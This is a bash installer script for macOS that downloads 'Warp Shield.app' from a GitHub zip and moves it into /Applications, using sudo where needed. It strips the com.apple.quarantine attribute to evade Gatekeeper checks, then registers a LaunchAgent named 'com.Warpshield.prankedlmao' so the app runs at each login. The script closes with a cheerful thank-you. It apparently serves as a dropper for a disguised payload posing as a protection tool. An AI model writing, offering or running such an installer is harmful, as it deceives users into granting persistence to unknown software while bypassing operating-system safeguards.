#!/usr/bin/env bash
set -euo pipefail
set -x


# --- Config ---
ZIP_URL="https://github.com/44sk/l/archive/refs/heads/main.zip"
TMPDIR="$(mktemp -d)"
APP_NAME="Warp Shield.app"
PLIST_NAME="com.Warpshield.prankedlmao.plist"

cleanup() {
  rm -rf "$TMPDIR"
}
trap cleanup EXIT

cd "$TMPDIR"

curl -fsSL "$ZIP_URL" -o warp-shield.zip
unzip -q warp-shield.zip
rm warp-shield.zip

APP_PATH="$(find . -type d -name "$APP_NAME" -print -quit)"
if [ -z "$APP_PATH" ]; then
  exit 1
fi

DEST="/Applications/$(basename "$APP_PATH")"

# --- Replace any existing version ---
if [ -d "$DEST" ]; then
  if [ -w "$DEST" ]; then
    rm -rf "$DEST"
  else
    sudo rm -rf "$DEST"
  fi
fi

if [ -w "/Applications" ]; then
  mv "$APP_PATH" /Applications/
else
  sudo mv "$APP_PATH" /Applications/
fi

xattr -d -r com.apple.quarantine "$DEST" 2>/dev/null || true
chmod +x "$DEST/Contents/MacOS/"* 2>/dev/null || true

PLIST_SRC="$DEST/Contents/Resources/$PLIST_NAME"
PLIST_DST="$HOME/Library/LaunchAgents/$PLIST_NAME"

mkdir -p "$HOME/Library/LaunchAgents"

if [ -f "$PLIST_SRC" ]; then
  cp "$PLIST_SRC" "$PLIST_DST"
  chmod 644 "$PLIST_DST"
  chown "$USER":staff "$PLIST_DST"

  plutil -lint "$PLIST_DST" >/dev/null 2>&1 || true
  launchctl bootout gui/$(id -u) "$PLIST_DST" 2>/dev/null || true
  launchctl bootstrap gui/$(id -u) "$PLIST_DST" 2>/dev/null || true
  launchctl enable "gui/$(id -u)/com.Warpshield.prankedlmao" 2>/dev/null || true
fi


open "$DEST"

echo
echo "Thanks for downloading :)"
